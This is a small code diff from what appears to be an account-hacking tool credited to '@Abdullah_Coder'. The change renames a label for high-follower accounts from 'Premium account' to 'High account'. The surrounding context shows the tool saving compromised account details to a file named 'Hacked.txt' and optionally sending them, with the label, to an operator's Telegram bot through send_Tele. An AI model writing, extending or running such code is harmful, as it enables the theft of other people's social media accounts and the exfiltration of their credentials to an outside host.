@@ -80,14 +80,14 @@ def get_inf(user,passs,ask,tokin,iddd):
 By : @Abdullah_Coder
  """)
         if int(followes) > 1000:
-            print("✅ Premium account")
+            print("✅ High account")
         f = open("Hacked.txt",'a+')
         f.write(shug+"\n")
         f.close()
         if(ask == "Y" or ask == "y"):
             send_Tele(tokin,iddd,shug)
             if int(followes) > 1000:
-              send_Tele(tokin,iddd,"✅ Premium account")
+              send_Tele(tokin,iddd,"✅ High account")
         
 
         return shug
